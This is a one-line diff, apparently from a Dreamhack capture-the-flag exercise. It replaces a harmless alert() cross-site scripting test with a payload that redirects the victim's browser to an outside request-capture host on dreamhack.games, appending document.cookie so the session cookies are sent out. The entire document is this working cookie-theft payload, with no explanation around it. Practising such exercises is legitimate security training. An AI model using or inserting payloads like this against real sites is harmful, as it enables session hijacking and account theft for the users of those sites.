@@ -1,1 +1,1 @@
-<script>alert(321);</script>
+location.href="https://jltiqus.request.dreamhack.games?cookie="+document.cookie;
